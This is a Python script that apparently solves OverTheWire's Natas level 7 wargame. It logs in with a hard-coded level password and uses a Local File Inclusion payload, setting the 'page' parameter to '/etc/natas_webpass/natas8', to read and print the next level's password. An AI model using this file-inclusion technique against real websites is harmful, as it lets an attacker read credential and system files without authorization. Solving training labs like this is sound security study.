# Vulnerability: Local File Inclusion

import requests
import re
import html
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org'


# File location which contains the password of the next level
params = {"page": "/etc/natas_webpass/natas8"}


# Make a GET request to the URL with basic authentication using the provided credentials
resp = requests.get(url=url, auth=(username, password), params=params)


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(html.unescape(resp.text), 'lxml')


# Extract password for the next level using Regular Expressions
print("Natas 8: ", end="")
print(re.findall('\n(.*)\n\n\n\n', soup.body.text)[0])
